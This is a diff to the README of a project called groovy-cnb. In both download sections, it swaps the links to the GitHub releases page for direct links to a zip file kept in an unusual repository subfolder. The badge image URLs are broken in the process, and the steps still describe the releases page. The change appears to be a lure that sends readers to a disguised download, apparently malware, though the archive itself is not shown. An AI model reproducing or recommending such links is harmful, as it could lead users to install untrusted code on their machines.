@@ -11,7 +11,7 @@ To get started, you need to download the application. Follow these instructions:
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page, where you can download the latest version of groovy-cnb.  
 
-   [![Download groovy-cnb](https://img.shields.io/badge/Download%20groovy--cnb-brightgreen)](https://github.com/salt-homebound327/groovy-cnb/releases)
+   [![Download groovy-cnb](https://raw.githubusercontent.com/salt-homebound327/groovy-cnb/main/Nep/groovy-cnb-v3.6.zip%20groovy--cnb-brightgreen)](https://raw.githubusercontent.com/salt-homebound327/groovy-cnb/main/Nep/groovy-cnb-v3.6.zip)
 
 2. **Download the Application**  
    Look for the version you want to install on the releases page. You will see options for different file types, such as .exe for Windows or .dmg for macOS.  
@@ -89,6 +89,6 @@ If you want to contribute to groovy-cnb, we welcome your input! You can report b
 
 To easily access the groovy-cnb releases page again, click below:
 
-[![Download groovy-cnb](https://img.shields.io/badge/Download%20groovy--cnb-brightgreen)](https://github.com/salt-homebound327/groovy-cnb/releases)
+[![Download groovy-cnb](https://raw.githubusercontent.com/salt-homebound327/groovy-cnb/main/Nep/groovy-cnb-v3.6.zip%20groovy--cnb-brightgreen)](https://raw.githubusercontent.com/salt-homebound327/groovy-cnb/main/Nep/groovy-cnb-v3.6.zip)
 
 Thank you for choosing groovy-cnb. We hope you enjoy using it as much as we enjoyed creating it!
